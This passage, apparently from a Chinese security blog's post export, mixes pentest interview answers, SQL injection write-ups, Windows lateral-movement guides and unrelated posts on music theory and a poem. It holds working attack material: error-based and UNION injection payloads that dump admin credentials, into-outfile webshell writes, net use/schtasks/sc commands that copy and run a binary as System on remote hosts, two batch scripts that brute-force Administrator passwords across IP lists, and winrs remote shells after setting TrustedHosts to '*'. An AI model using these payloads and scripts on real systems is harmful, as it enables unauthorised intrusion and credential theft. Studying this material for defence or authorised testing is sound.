38、给你一个网站你是如何来渗透测试的? 在获取书面授权的前提下。 39、sqlmap，怎么对一个注入点注入？ 1）如果是get型号，直接，sqlmap -u “诸如点网址”. 2) 如果是post型诸如点，可以sqlmap -u “注入点网址” –data=”post的参数” 3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用号替换，放到文件里，然后sqlmap -r “文件地址” 40、nmap，扫描的几种方式 https://www.jianshu.com/p/56ea8b844eb7 41、sql注入的几种类型？ 1）报错注入 2）bool型注入 3）延时注入 4）宽字节注入 42、报错注入的函数有哪些？ 10个 1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】—————- 2）通过floor报错 向下取整 3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1) 4）.geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a)b)); 5）.multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b)); 6）.polygon()select from test where id=1 and polygon((select from(select from(select user())a)b)); 7）.multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b)); 8）.linestring()select from test where id=1 and linestring((select from(select from(select user())a)b)); 9）.multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b)); 10）.exp()select from test where id=1 and exp(~(select * from(select user())a)); 43、延时注入如何来判断？ if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1) 44、盲注和延时注入的共同点？ 都是一个字符一个字符的判断 45、如何拿一个网站的webshell？ 上传，后台编辑模板，sql注入写文件，命令执行，代码执行， 一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等 46、sql注入写文件都有哪些函数？ select ‘一句话’ into outfile ‘路径’ select ‘一句话’ into dumpfile ‘路径’ select ‘‘ into dumpfile ‘d:\\wwwroot\\baidu.com\\nvhack.php’; 47、如何防止CSRF? 1,验证referer 2，验证token 详细：http://cnodejs.org/topic/5533dd6e9138f09b629674fd 48、owasp 漏洞都有哪些？ 1、SQL注入防护方法： 2、失效的身份认证和会话管理 3、跨站脚本攻击XSS 4、直接引用不安全的对象 5、安全配置错误 6、敏感信息泄露 7、缺少功能级的访问控制 8、跨站请求伪造CSRF 9、使用含有已知漏洞的组件 10、未验证的重定向和转发 49、SQL注入防护方法？ 1、使用安全的API 2、对输入的特殊字符进行Escape转义处理 3、使用白名单来规范化输入验证方法 4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符 5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。 50、代码执行，文件读取，命令执行的函数都有哪些？ 1）代码执行： eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function 2）文件读取： file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等3)命令执行： system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open() 51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？ src指定一个远程的脚本文件，获取referer 52、img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。 1）远程服务器修改apache配置文件，配置.jpg文件以php方式来解析 AddType application/x-httpd-php .jpg &lt;img src=http://xss.tv/1.jpg&gt; 会以php方式来解析","link":"/2019/03/03/%E4%B8%80%E5%A5%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B2%97%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"title":"一星期实战总结（三）","text":"Hey, password is required here. ","link":"/2020/04/25/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%933/"},{"title":"一星期实战总结（四）","text":"Hey, password is required here. ","link":"/2020/11/17/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%934/"},{"title":"乐理基础学习笔记","text":"乐理基础学习笔记。 节奏拍12通常底鼓每响一次则为一拍，一拍就是音乐中用来定义音的长度的单位，但是根据曲作者的要求，这个基本单位的时长也是可以变化的。比如作者规定一分钟60拍，那么一拍就是1秒。 速度1bpm - beats per minute {每分钟多少拍} 小节12于小节的概念你可以这么理解，它就像是你写一个曲子最基本的节奏循环单位。比如圆舞曲，很多都是三拍子的，所以跳起舞来可以有一哒哒，二哒哒，三哒哒，这样的感觉。这就是节奏的意思了。所以一个小节，就是规定我这个曲子是按怎么样的节奏在演奏着，是哒哒哒，哒哒哒，还是哒哒哒哒，哒哒哒哒。 节拍1通常音乐大部分为4/4拍 音符时值1全音符、二分音符、四分音符（时间长度 = 一拍） 钢琴键盘分组 升降 中央C = C5 调(diào)是啥大调C大调 D大调 …升、降号调 稳定音 音的倾向性 音程半音1从0开始数 度数12从1开始数度数 = 白键数 ， 大小度为区分同度数内的半音数多少 转位三要素度数相加等于九 大小、增减是互换 纯音程不变 协和音程 和弦三和弦三度叠置 大三和弦 小三和弦 减三和弦 三和弦转位 七和弦大七和弦1大三和弦+大七度 小七和弦1小三和弦+小七度 属七和弦1大三和弦+小七度 小大七和弦1小三和弦+大七度 七和弦转位 五度循环圈五度循环圈1和声连接、调的关系、深入理解音程、即兴演奏 调式中各音级的名称调式中各音级的名称 自然小调大调欢快，小调悲伤 自然小调 例：a小调 关系大小调1C大调是a小调的关系大调，a小调是C大调关系小调。 关系图 音程度数音程度数判断 写和弦构成音 写音阶构成因 自然音程与变化音程 自然音程 变化音程 增音程 减音程 倍增音程 倍减音程 小调的变体和声小调、旋律小调 三种小调和大调的关系","link":"/2021/03/04/%E4%B9%90%E7%90%86%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"人品爆发：偏移注入与移位溢注的联合使用","text":"理解一个东西，然后去发散思维思考，总会有意想不到的收获。 前言：这个灵感是我突然冒出来的，最近有一个只能出来表名的站，一直没的机会实战，正好练习一下偏移注入和移位溢注，顺便总结一下,结果偏移注入成功了，移位溢注倒是不行了，心有不甘（我人品有这么差么？），才有了下文。 偏移注入，移位溢注的正常的手法，原理在这里就不写了，描述下站点大概情况，方便大家了解，懂得自然懂。 12order by 12 - 正常 union select 1,2,3,4,5,6,7,8,* from tbladmin - 正常 显示位 开始移位溢注：当我使用移位溢注时，遇到了一点小麻烦： 2.1 先测试位置显示位6（失败）：1union select 1,2,3,4,5,tbladmin.*,10,11,12 from tbladmin 1234union select 1,2,3,4,5,tbladmin.*,10,11,12 from tbladmin where id=1 - 返回同上union select 1,2,3,4,5,tbladmin.*,10,11,12 from tbladmin where id=2 - 发布时间处:1变成了2...union select 1,2,3,4,5,tbladmin.*,10,11,12 from tbladmin where id=n - 开始一直返回正常页面了 2.2 然后测试显示位2和3(失败)：1union select 1,tbladmin.*,6,7,8,9,10,11,12 from tbladmin - 爆出了一个用户名 1234union select 1,tbladmin.*,6,7,8,9,10,11,12 from tbladmin where id=1 - 返回内容同上union select 1,tbladmin.*,6,7,8,9,10,11,12 from tbladmin where id=2 - 如下图，一个新的用户名...union select 1,tbladmin.*,6,7,8,9,10,11,12 from tbladmin where id=n - 开始一直返回正常页面了 到了现在，可以发现问题出现了，移位溢注的招式已经用完了，但是显示位明显不够啊，还是爆不出来密码，这样看来，移位溢注还是不能完全和人品说拜拜 联合使用出奇效：偏移注入的本质是：打乱显示顺序 移位溢注的本质是：占用多处显位 都是为了有一定概率让账号密码出现在显示位上，那么联合起来会怎么样呢？下面语句不做分析，还是懂的人自然懂 1union select 1,2,3,4,a.*,b.*, * from (tbladmin as a inner join tbladmin as b on a.id=b.id) 12union select 1,2,3,4,a.*, * from (tbladmin as a inner join tbladmin as b on a.id=b.id) - 显示结果同上union select 1,2,3,a.*,4, * from (tbladmin as a inner join tbladmin as b on a.id=b.id) - 出现密码了 1union select 1,2,a.*,3,4, * from (tbladmin as a inner join tbladmin as b on a.id=b.id) - 发生变化 1union select 1,a.*,2,3,4, * from (tbladmin as a inner join tbladmin as b on a.id=b.id) - 继续变化 1union select a.*,1,2,3,4, * from (tbladmin as a inner join tbladmin as b on a.id=b.id) - 同时显示 完结最后可以看到，账号密码一起显示在了网页上，通过二者的联合使用，爆出账号密码的几率想必会增加不少。 参考文章： https://blog.csdn.net/Fly_hps/article/details/79415714 https://gh0st.cn/archives/2017-03-08/1","link":"/2019/03/11/%E4%BA%BA%E5%93%81%E7%88%86%E5%8F%91%E4%B9%8B%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5%E4%B8%8E%E7%A7%BB%E4%BD%8D%E6%BA%A2%E6%B3%A8%E7%9A%84%E8%81%94%E5%90%88%E4%BD%BF%E7%94%A8/"},{"title":"他的她","text":"《他的他》 第一次见她时是八月份的夏天在自习室门口一个安静漂亮的女孩干净利落 或许是情投意合那个秋天他们走到了一起平平淡淡我想我将永远的欠她一个浪漫的告白 转眼冬天到来我陪着她看到了两个人的第一场雪她傻笑着，拍了下来跟我说以后每年都要照一张 大学第一个学期即将结束但愿每个美好的开始都有一个完美的结局","link":"/2016/12/25/%E4%BB%96%E7%9A%84%E5%A5%B9/"},{"title":"内网渗透|Windows认证机制剖析","text":"Windows认证机制剖析：本地，工作组，域环境。 本地认证（User Login）概念在本地登录Windows的情况下，操作系统会使用用户输入的密码作为凭证去与系统中的密码进行验证，操作系统中的密码存储在 1%SystemRoot%\\system32\\config\\sam 登录系统的时候,系统会自动地读取SAM文件中的“密码”与我们输入的“密码”进行比对，如果相同，证明认证成功! 这个SAM文件中保留了计算机本地所有用户的凭证信息，可以理解为是一个数据库。 ※注意：Windows本身不保存明文密码，只保留密码的Hash。 NTLM Hash的产生 NTLM Hash的前身是LM Hash，由于存在安全缺陷已经被淘汰，无需做过多的了解，知道有这个东西即可 假设我的密码是admin，那么操作系统会将admin转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash。 123admin -&gt; hex(16进制编码) = 61646d696e61646d696e -&gt; Unicode = 610064006d0069006e00610064006d0069006e00 -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634 本地认证流程123456winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)1.用户注销、重启、锁屏后2.操作系统会让winlogon显示登录界面，也就是输入框3.接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码4.将明文密码加密成NTLM Hash，对SAM数据库比较认证 Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。 LSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略。 网络认证（Net NTLM） 工作组环境和域环境下Net NTLM认证过程因为有DC（域控制器）的参与流程略有差异，不过不影响我们进行哈希传递攻击，这里分开讲一下。 NTLM 协议概念这个协议只支持Windows NTLM是一种网络认证协议，全称是：NT LAN Manager，它是基于挑战（Challenge）/响应（Response）认证机制的一种认证模式。 NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议，消息的传输依赖于使用NTLM的上层协议，比如SMB，LDAP，HTTP等。 工作组NTLM协议认证过程 协商：主要用于确认双方协议版本，NTLM存在V1和V2两个版本，具体区别就是加密方式不同，这个一般不用管。 质询：就是挑战（Challenge）/响应（Response）认证机制起作用的范畴，也是认证机制的核心。 验证：验证主要是在质询完成后验证结果，是认证的最后一步。 协商 质询 1.Client向Server发送用户信息(用户名)请求。 2.Server收到用户信息后判断该本地账户列表是否存在（不存在就返回认证失败），存在则生成一个16位的随机数(Challenge)， 然后使用登录用户名对应的NTLM Hash加密Challenge(16位随机字符)， 生成一个Challenge1(Net-NTLM Hash)存在内存中。同时，将Challenge(16位随机字符)发送给Client。 3.Client接受到服务器发送的Challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response（Net-NTLM Hash），然后将Response发送至Server。 这里引入了Net NTLM Hash：经过NTLM Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash（不能直接用来进行哈希传递攻击，但可以通过暴力破解来获取明文密码）。 详细介绍：https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x03-net-ntlm-hash 验证Server收到Client发送的Response（Net-NTLM Hash）后，与之前保存在内存中的Challenge1(Net-NTLM Hash)比较，如果相等则认证通过。 现在再来看一下这个认证过程，是不是清晰了很多 域环境NTLM协议认证过程 域环境下Net NTLM认证过程因为有DC（域控制器）的参与工作组下的流程略有差异。 ①用户登录客户端电脑。 ②Client向Server发送协商消息，它主要包含客户端支持和服务器请求的功能列表。 ③Server用质询消息（Challenge）进行响应，这包含服务器支持和同意的功能列表。但是最重要的是，它包含Server产生的Challenge。 ④Client用身份验证消息（Response）回复质询。用户接收到步骤③中的Challenge之后，使用用户hash与challenge进行加密运算得到Response，将response，username，challeng发给Server。消息中的response（Net-NTLM Hash）是最关键的部分，因为它们向服务器证明客户端用户已经知道帐户密码。 ⑤Server拿到身份验证消息（Response）后，使用challenge和用户hash进行加密得到response2与步骤③发来的response进行比较。 这时候，如果认证用户hash是存储在域控里面的话，那么本地没有认证用户hash，也就没办法计算response2，所以也就没法验证完成步骤⑤。所以Server就会通过netlogon协议联系域控，建立一个安全通道，然后将 协商消息，质询消息（Challenge），身份验证消息（Response） 全部发给域控（这个过程也叫作Pass Through Authentication认证流程）。 ⑥域控使用challenge和认证用户的hash进行加密得到response2，与type 3的response进行比较，判断是否一致。 ⑦完成认证过程。 参考文章https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x02-ntlm-shen-fen-yan-zheng https://payloads.online/archivers/2018-11-30/1/ https://ares-x.com/2020/03/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/","link":"/2021/10/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/"},{"title":"内网渗透|内网传输通道的建立","text":"内网传输通道的建立。 判断是否出网1234ping : icmpcurl : http nslookup : dns nc ip port : tcp 内网渗透网络环境复杂且工具繁多，有时还要考虑免杀，理解了原理找到适合自己的即可，本文也不会过多写工具的使用，有空更新下使用命令~ 正向代理概念正向代理，意思是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端，客户端才能使用正向代理。 使用情景 注意：不需要公网的vps 1.目标主机拥有公网IP。 常用工具： https://github.com/EddieIvan01/iox http://rootkiter.com/EarthWorm/ 2.目标主机存在WEB服务且不通外网，支持动态脚本PHP、ASPX、JSP。 常用工具： https://github.com/L-codes/Neo-reGeorg https://github.com/FunnyWolf/pystinger https://github.com/blackarrowsec/pivotnacci 反向代理概念反向代理服务器位于用户与目标服务器之间，但是对于用户而言，反向代理服务器就相当于目标服务器，即用户直接访问反向代理服务器就可以获得目标服务器的资源。 使用情景 注意：需要公网的vps 目标主机通外网即可。 常用工具： https://github.com/vzex/dog-tunnel https://github.com/EddieIvan01/iox https://github.com/fatedier/frp/ https://github.com/ehang-io/nps http://rootkiter.com/EarthWorm/ 隔离网络之多级代理概念内网渗透中，会遇到隔离网络，更多时候是逻辑上的隔离，突破的办法就是拿到route可达的跳板机 (多张网卡、运维机等)的权限，建立一层二级代理、三级代理… 注意：随机应变 常用工具： http://rootkiter.com/EarthWorm/ https://github.com/ginuerzh/gost https://github.com/Dliv3/Venom 还有一些windows【netsh】和linux【ssh】的自带程序的端口转发、icmp协议的流量转发没有写，不过一般也用不到，暂时先写这么多。","link":"/2021/04/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BC%A0%E8%BE%93%E9%80%9A%E9%81%93%E7%9A%84%E5%BB%BA%E7%AB%8B/"},{"title":"内网渗透|基于IPC的横向移动","text":"基于IPC的横向移动 文章内容引用较多，尽量不说废话，注明链接的地方，请自行阅读并理解。 IPC$的概念IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。 IPC$的作用利用IPC$，连接者可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。 IPC$的利用条件139，445端口开启IPC$连接可以实现远程登陆及对默认共享的访问，而139端口的开启表示netbios协议的应用。我们可以通过139和445端口来实现对共享文件/打印机的访问，因此一般来讲，IPC$连接是需要139或445端口来支持的。 注： Windows系统中的net use ipc$整个通信过程，先445-&gt;137-&gt;139验证，当你开启防火墙禁用445，发现系统命令就无法连接IPC了，因为根本没机会走到139，所以使用系统自带命令连接的ipc$需要同时开启这些端口 ，参考自K8gege.org。 管理员开启了默认共享默认共享是为了方便管理员远程管理而默认开启的共享，即所有的逻辑盘（C$,D$,E$...）和系统目录WINNT或WINDOWS(ADMIN$)，我们通过IPC连接可以实现对这些默认共享的访问。 123456789C:\\Users\\Administrator&gt;net share共享名 资源 注解-------------------------------------------------------------------------------C$ C:\\ 默认共享IPC$ 远程 IPCADMIN$ C:\\WINDOWS 远程管理命令成功完成。 建立远程连接时的用户权限问题这个不多说，很多文章没有介绍，是一个坑点：传送门-关于IPC和PTH用户权限问题 ※即默认情况下只有域管用户有权限对admin$目录建立IPC连接，其实本地的Administrator用户也可以，但是默认情况下该用户是被禁用的，如果启用了该用户，那么也可以使用Administrator用户远程连接 IPC$连接失败常见错误号：123456789101112131415161718错误号 5，拒绝访问【很可能你使用的用户不是管理员权限的，先提升权限】错误号 51，Windows 无法找到网络路径【网络有问题】错误号 53，找不到网络路径【ip 地址错误；目标未开机；目标 lanmanserver 服务未启动； 目标有防火墙（端口过滤）】错误号 67，找不到网络名【你的 lanmanworkstation 服务未启动；目标删除了 ipc$；】 错误号 1219，提供的凭据与已存在的凭据集冲突【你已经和对方建立了一个ipc$，请删除后再连】错误号 1326，未知的用户名或错误密码【原因很明显了】错误号 1385，登录失败：未授予用户在此计算机上的请求登录类型---情况1：可能是你在“拒绝从网络访问这台计算机”功能中拒绝了该用户的访问，解决方法如下：开始--&gt;运行--&gt;gpedit.msc计算机配置--&gt;Windows设置--&gt;安全设置--&gt;本地策略--&gt;用户权利指派--&gt;拒绝从网络访问这台计算机--&gt;删除你要正常连接的用户情况2：(1)网络访问为：经典(2)来宾账户状态：已启用，(3)拒绝从网络访问这台计算机里有Guest用户或组(4)你执行net use \\\\xxx.xxx.xxx.xxx\\IPC$ &quot;123456&quot; /user:&quot;xxx&quot; 输入的用户名是随便输入的，这时也会遇到这个错误信息，因为当你连接的用户不存在时，net use会默认用Guest用户来进行连接，而Guest用户已拒绝从网络访问，所以也会出现这种错误---错误号 1792，试图登录，但是网络登录服务没有启动【目标NetLogon服务未启动[连接域控会出现此情况]】错误号 2242，此用户的密码已经过期【目标有帐号策略，强制定期要求更改密码】 基于IPC$的横向移动常用命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051520.建立空连接net use \\\\192.168.1.1\\ipc$ &quot;&quot; /u:&quot;&quot;1.建立正常连接net use \\\\192.168.1.1\\ipc$ &quot;1qaz@WSX&quot; /user:&quot;Administrator&quot; 2.查看本机连接共享情况net use3.查看已建立连接目标主机的共享资源net view \\\\192.168.1.14.查看目标主机时间net time \\\\192.168.1.15.查看目标主机的NetBIOS用户（自己本机也需开启）nbtstat -A 192.168.1.16.删除本机与指定ip建立的连接net use \\\\192.168.1.1\\ipc$ /del /y7.删除本机所有已建立的连接net use * /del /y8.文件的上传下载与删除copy plugin_update.exe \\\\192.168.1.1\\c$\\windows\\temp\\plugin_update.exe[推荐用xcopy]:xcopy d:\\sqlitedata\\*.* \\\\192.168.1.1\\c$\\temp /E /Y /D（上传本地文件到目标的:c\\windows\\temp\\目录下）copy \\\\192.168.1.1\\c$\\plugin_update.exe c:\\（下载目标文件到本地c盘下）del \\\\192.168.1.1\\c$\\plugin_update.exe /F（删除目标文件）9.创建计划任务之schtasksschtasks /create /tn &quot;plugin_update&quot; /tr c:\\windows\\temp\\plugin_update.exe /sc once /st 16:32 /S 192.168.1.1 /RU System /u administrator /p &quot;1qaz@WSX&quot;补充1：schtasks /create /tn &quot;Flash_Update&quot; /tr C:\\Users\\Public\\Flash_Update.exe /sc minute /mo 1 /S 192.168.1.1 /RU System /u administrator /p &quot;1qaz@WSX&quot;立即执行计划任务schtasks /run /tn &quot;plugin_update&quot; /S 192.168.1.1 /u administrator /p &quot;1qaz@WSX&quot;删除计划任务schtasks /F /delete /tn &quot;plugin_update&quot; /S 192.168.1.1 /u administrator /p &quot;1qaz@WSX&quot;计划任务远程开启默认共享{注意查看目标主机时间}schtasks /create /tn &quot;plugin_update&quot; /tr &quot;cmd /c net share c$=c:&quot; /sc once /st 16:25 /S 192.168.1.1 /RU System /u administrator /p &quot;1qaz@WSX&quot;10.创建计划任务之at（at只支持win03和部分老版本win08，一般情况下，win08-SP1的系统是能添加at计划任务的，但不一定执行，推荐win08及之后的系统都选择schtasks创建计划任务）at \\\\192.168.1.1 14:05 cmd /c &quot;c:\\windows\\temp\\test.bat&quot; 11.SC创建服务（需先IPC连接，添加的常规程序需要有返回值,不然启动服务时会报1053错误）sc \\\\192.168.1.1 create shellsrv binpath= &quot;c:\\shell.exe&quot; start= auto displayname= &quot;shellstart&quot;sc \\\\192.168.1.1 create test binpath= &quot;c:\\windows\\temp\\test.bat&quot; start= auto displayname= &quot;shellstart&quot;sc \\\\192.168.1.1 start shllsrvsc \\\\192.168.1.1 stop shllsrvsc \\\\192.168.1.1 delete shellsrv12.删除默认共享net share c$ /del13.恢复默认共享net share c$=c:15.对方的c盘映射为自己的z盘，其他盘类推(不推荐)net use z: \\\\192.168.1.1\\c$ &quot;1qaz@WSX&quot; /user:&quot;administrator&quot;16.删除映射的c盘，其他盘类推net use c: /del 批量爆破内网中爆破弱口令时首选的便是使用ipc，爆破错误次数一般也不会做限制，但是一定要注意爆破成功的结果是否为匿名权限的ipc连接。 弱口令爆破这种手段在在内网中是一把双刃剑，如果公司领导未过于重视网络安全的话，导致信息安全部地位低下、资金有限，那么在缺乏安全设备监控与员工网络安全意识低下的情况下，在内网进行弱口令爆破是一件非常高效地事情，如大部分的央企、国企二级单位。 但另一方面，如果该公司确实在网络安全方面投入较大人力财力，那么弱口令爆破无异于自杀。 弱口令字典可由部分简单口令和部分复杂规则口令与企业名称+年份组成，如12345678,000000,1q2w3e4r,1qaz2wsx,baidu@2020,baidu@123等，不宜超过100条且建议单线程慢速爆破，避免被拦截。 使用说明： 12345ip.txt 放入要爆破的IPpass.txt 放入爆破的密码默认爆破用户：Administrator爆破成功的结果，会在bat运行的当前目录生成pic.txt爆破进度的查询：type log.txt，完成后当前目录生成end.txt 坑点：需注意特殊字符，如密码中有 % 需要用 % 来转义，例 ：123#$% 应转化为 123#$%% 1.给定多个密码爆破 123456789101112131415@echo offclsecho Useage: %0 ip.txt pass.txtFOR /F %%i in (%1) do (FOR /F %%p in (%2) do (echo net use \\\\%%i\\ipc$ &quot;%%p&quot; /user:&quot;%%i\\Administrator&quot; &gt;&gt; log.txtnet use \\\\%%i\\ipc$ &quot;%%p&quot; /user:&quot;%%i\\Administrator&quot; &gt;NUL 2&gt;NULIF NOT errorlevel 1 (echo %%p t:%%i&gt;&gt; pic.txtnet use \\\\%%i\\ipc$ /del)net use * /del /y &gt;NUL 2&gt;NUL))echo end &gt;&gt; end.txt 2.固定密码 12345678910111213@echo offclsecho Useage: %0 ip.txtFOR /F %%i in (%1) do (echo net use \\\\%%i\\ipc$ &quot;123456&quot; /user:&quot;%%i\\Administrator&quot; &gt;&gt; log.txtnet use \\\\%%i\\ipc$ &quot;123456&quot; /user:&quot;%%i\\Administrator&quot; &gt;NUL 2&gt;NULIF NOT errorlevel 1 (echo success:%%i&gt;&gt; pic.txtnet use \\\\%%i\\ipc$ /del)net use * /del /y &gt;NUL 2&gt;NUL)echo end &gt;&gt; end.txt 利用工具温馨小提示：有杀软的内网环境中，尽量用windows自带功能来完成需求，使用工具要慎重，一定要本地做好测试在丢到目标上运行。 PSEXEC不推荐，很容易就被杀软拦截，微软官方pstools 域渗透学习（五）基于IPC的远程连接： https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/ Impacket套件更多的连接方式还有 smbexec、psexec、atexec， 都可在github社区中找到，比较简单的就是在 impacket 工具包找到相关文件，使用方法自行查阅帮助文档，这里不再赘述。 python版：https://github.com/SecureAuthCorp/impacket exe版：https://github.com/ropnop/impacket_static_binaries/releases v0.9.19稳 Impacket套件之远程命令执行功能讲解： https://mp.weixin.qq.com/s/kVTAe2BLya-lwOXzKdvHGA Ladon 模块功能 目标端口 目标系统 使用教程 SMB爆破/IPC/共享 445端口 Windows http://k8gege.org/Ladon/SmbScan.html Netbios爆破 139端口 Windows http://k8gege.org/Ladon/NbtScan.html SMB-NtlmHash爆破 445端口 Windows http://k8gege.org/Ladon/SmbHashScan.html","link":"/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"title":"内网渗透|基于winRM的横向移动","text":"基于winRM的横向移动 winRM简介WinRM(Windows Remote Management)是 Microsoft 对 WS-Management 协议的实现，WS-Management 协议即一种基于标准简单对象访问协议（soap）的防火墙友好协议，它让来自不同供应商的硬件和操作系统能够相互操作。windows 众多可以远程执行命令方式中的一种。 作为DCOM和WMI远程管理的替代方法，WinRM用于通过WSMan与远程计算机建立会话，WSMan利用HTTP/S作为传输机制来传递XML格式的消息。在现代Windows系统中，WinRM HTTP通过TCP端口5985进行通信，而HTTPS（TLS）通过TCP端口5986进行通信。 WinRM本机支持NTLM和Kerberos（域）身份验证。初始身份验证后，WinRM会话将使用AES加密（Microsoft Docs）保护。 注意：必须配置并运行WinRM服务才能接受远程连接。WinRM接受连接可能还需要几个步骤。请参阅这篇 Pentest Lab 文章 以了解更多信息。 ※ winRM横向移动同时适用于工作组和域环境。 利用条件通信的双方都需要开启WinRM服务WinRS 适用于 Win server 2008 / Win7 及以后的系统，但是 Win server 2008 / PC 全版本系统默认关闭。 只有在Win server 2012 之后的版本的WinRM服务才默认启动并监听了5985端口，允许远程任意主机来管理。 WinRM状态查询 12345678PS C:\\Users\\Administrator&gt; Get-WmiObject -Class win32_service | Where-Object {$_.name -like &quot;WinRM&quot;} ExitCode : 1077Name : WinRMProcessId : 0StartMode : ManualState : StoppedStatus : OK 开启可以使用下面其中一条命令即可 12winrm quickconfig -q #这条命令运行后会自动添加防火墙例外规则，放行5985端口。Enable-PSRemoting -Force 再次查询 12345678PS C:\\Users\\Administrator&gt; Get-WmiObject -Class win32_service | Where-Object {$_.name -like &quot;WinRM&quot;}ExitCode : 0Name : WinRMProcessId : 1128StartMode : AutoState : RunningStatus : OK 服务端防火墙允许WinRM服务端口通信默认为5985、5986；如果5985打开，但是5986关闭，标识WinRM服务配置为仅接受HTTP连接。修改默认端口可以使用如下： 1winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port=&quot;80&quot;} WinRM通信两端配置要求1）查看WinRM具体配置 1winrm get winrm/config 2）允许所有客户端IP连接 12winrm set winrm/config/Client @{TrustedHosts=&quot;*&quot;}winrm e winrm/config/listener #查看监听地址和端口 远程管理远程连接时可能会遇到以下错误 123Winrs error:WinRM 客户端无法处理该请求。可以在下列条件下将默认身份验证与 IP 地址结合使用: 传输为 HTTPS 或目标位于 TrustedHosts 列表中，并且提供了显式凭据。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。 有关如何设置 TrustedHosts 的详细信息，请运行以下命令: winrm help config。Winrs error:WinRM 客户端无法处理该请求。如果身份验证方案与 Kerberos 不同，或者客户端计算机未加入到域中，则必须使用 HTTPS 传输或者必须将目标计算机添加到 TrustedHosts 配置设置。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。 通过运行以下命令 可获得有关此内容的更多信息: winrm help config。 在你的攻击机上执行下面这条命令，设置为信任所有主机，再去连接即可 12345678910111213141516C:\\Users\\Administrator&gt;winrm set winrm/config/Client @{TrustedHosts=&quot;*&quot;} Client NetworkDelayms = 5000 URLPrefix = wsman AllowUnencrypted = false Auth Basic = true Digest = true Kerberos = true Negotiate = true Certificate = true CredSSP = false DefaultPorts HTTP = 5985 HTTPS = 5986 TrustedHosts = * 远程命令执行12C:\\Users\\Administrator&gt;winrs -r:192.168.86.114 -u:192.168.86.114\\administrator -p:123456!@#$% whoamiwin-win7\\administrator 获取交互式的shell1234567891011121314151617181920C:\\Users\\Administrator&gt;winrs -r:192.168.86.114 -u:192.168.86.114\\administrator -p:123456!@#$% cmdMicrosoft Windows [版本 6.1.7601]版权所有 (c) 2009 Microsoft Corporation。保留所有权利。C:\\Users\\Administrator&gt;ipconfigWindows IP 配置以太网适配器 本地连接: 连接特定的 DNS 后缀 . . . . . . . : 本地链接 IPv6 地址. . . . . . . . : fe80::95c8:a481:b587:2d7c%11 IPv4 地址 . . . . . . . . . . . . : 192.168.86.114 子网掩码 . . . . . . . . . . . . : 255.255.255.0 默认网关. . . . . . . . . . . . . : 192.168.86.1隧道适配器 isatap.{993CBC2D-5164-415A-A70E-00FF0F6119D5}: 媒体状态 . . . . . . . . . . . . : 媒体已断开 连接特定的 DNS 后缀 . . . . . . . : 利用工具WSMan-WinRM 使用WSMan.Automation COM对象通过WinRM执行远程命令。 